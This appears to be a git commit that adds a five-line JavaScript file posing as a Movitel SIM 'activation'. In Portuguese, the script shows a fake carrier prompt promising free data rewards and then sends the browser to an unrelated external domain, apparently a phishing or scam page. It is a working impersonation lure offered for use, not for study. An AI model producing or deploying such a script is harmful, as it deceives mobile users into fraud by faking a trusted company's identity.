c0f33873999d9acf59754123a9e9501a5ea67cf4
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-08 05:30:41 -0700

    Create cabo-movitel-activation.js

---
+++ cabo-movitel-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Movitel: Prezado cliente, por favor verifique se o seu cartão SIM Movitel está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/cabo-movitel.html';
+}
